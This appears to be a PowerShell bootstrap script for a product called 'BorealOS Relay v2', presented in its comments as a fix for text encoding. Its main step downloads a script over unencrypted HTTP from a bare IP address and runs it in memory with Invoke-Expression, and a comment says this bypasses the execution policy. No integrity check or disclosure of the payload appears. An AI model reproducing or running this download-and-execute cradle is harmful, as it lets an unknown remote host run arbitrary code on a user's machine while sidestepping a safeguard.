# BorealOS Relay v2 - Bootstrap (ASCII only, fixes encoding)
# This script is pure ASCII to avoid any encoding issues itself.
# It downloads download.ps1 as raw bytes, decodes as UTF-8, and runs it.

# Force UTF-8 for console I/O
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Download as raw bytes (avoids WebClient guessing wrong charset)
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData("http://8.148.237.155:3003/download.ps1")

# Decode bytes as UTF-8
$scriptText = [System.Text.Encoding]::UTF8.GetString($bytes)

# Execute directly via Invoke-Expression (bypasses ExecutionPolicy)
Invoke-Expression $scriptText
